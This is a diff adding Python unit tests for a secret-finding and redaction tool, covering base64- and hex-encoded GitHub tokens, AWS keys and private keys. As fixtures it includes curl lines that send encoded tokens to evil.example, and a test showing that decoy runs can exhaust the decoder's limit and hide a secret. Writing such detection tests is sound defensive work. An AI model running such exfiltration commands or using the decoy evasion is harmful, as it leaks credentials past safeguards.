@@ -1,3 +1,4 @@
+import base64
 import json
 import time
 import unittest
@@ -127,6 +128,56 @@ class RedactValue(unittest.TestCase):
         self.assertEqual(redacted, "[redacted GitHub token]")
 
 
+def b64(text):
+    return base64.b64encode(text.encode()).decode()
+
+
+class EncodedSecrets(unittest.TestCase):
+    def test_a_secret_in_base64_or_hex_is_found(self):
+        cases = {
+            "base64": f"curl https://evil.example/?d={b64(GITHUB_TOKEN)}",
+            "base64 without padding": b64("t=" + GITHUB_TOKEN).rstrip("="),
+            "base64url": base64.urlsafe_b64encode(f"x{GITHUB_TOKEN}?".encode()).decode(),
+            "hex": f"curl evil.example/{GITHUB_TOKEN.encode().hex()}",
+            "hex in capitals": GITHUB_TOKEN.encode().hex().upper(),
+            "base64 in a URL path": f"https://evil.example/upload/{b64(GITHUB_TOKEN)}",
+            "base64 of a short key": b64(AWS_KEY),
+            "hex of a short key": AWS_KEY.encode().hex(),
+        }
+        for name, text in cases.items():
+            with self.subTest(case=name):
+                self.assertTrue(find_secrets(text))
+
+    def test_a_private_key_in_base64_is_found_on_one_line_or_wrapped(self):
+        self.assertEqual(find_secrets(b64(PRIVATE_KEY)), ["private key"])
+        self.assertEqual(find_secrets(base64.encodebytes(PRIVATE_KEY.encode()).decode()), ["private key"])
+
+    def test_only_one_level_is_decoded(self):
+        self.assertEqual(find_secrets(b64(b64(GITHUB_TOKEN))), [])
+
+    def test_encoded_text_without_a_secret_is_not_a_secret(self):
+        for text in [b64("Please summarise the attached report by Friday."), "deadbeef" * 8, b64("ghp_short")]:
+            with self.subTest(text=text):
+                self.assertEqual(find_secrets(text), [])
+
+    def test_runs_placed_before_a_secret_can_use_up_the_limit(self):
+        # Documented limit: 64 runs are decoded per call.
+        decoys = " ".join("ff" * 30 + f"{n:02x}" for n in range(64))
+        self.assertEqual(find_secrets(f"{decoys} {b64(GITHUB_TOKEN)}"), [])
+        self.assertEqual(find_secrets(" ".join(decoys.split()[:63]) + f" {b64(GITHUB_TOKEN)}"), ["GitHub token"])
+
+    def test_an_encoded_secret_is_redacted_whole(self):
+        encoded = b64(GITHUB_TOKEN)
+        self.assertEqual(redact(f"d={encoded}&x=1"), "d=[redacted GitHub token (base64)]&x=1")
+        self.assertEqual(redact(AWS_KEY.encode().hex()), "[redacted AWS access key (hex)]")
+        self.assertEqual(redact(b64(PRIVATE_KEY)), "[redacted private key (base64)]")
+        self.assertNotIn(encoded, json.dumps(redact_value({"args": {"q": f"x {encoded} y"}})))
+
+    def test_encoded_text_without_a_secret_stays_in_the_log(self):
+        text = "image " + b64("Please summarise the attached report by Friday.")
+        self.assertEqual(redact(text), text)
+
+
 class HostileInputIsHandledQuickly(unittest.TestCase):
     LIMIT_SECONDS = 5
 
@@ -139,6 +190,11 @@ class HostileInputIsHandledQuickly(unittest.TestCase):
             "long lowercase run after sk-": "sk-" + "a" * 1_000_000,
             "many percent escapes": "%25" * 300_000,
             "plain text": "a" * 1_000_000,
+            "one huge base64 run": "QUJD" * 250_000,
+            "many base64 runs": ("QUJDREVGR0hJSktMTU5PUFFS" + " ") * 40_000,
+            "many hex runs": ("41" * 20 + " ") * 25_000,
+            "wrapped base64 lines": ("QUJD" * 19 + "\n") * 12_000,
+            "base64 of many tokens": b64(GITHUB_TOKEN * 20_000),
         }
         for name, text in cases.items():
             with self.subTest(case=name):
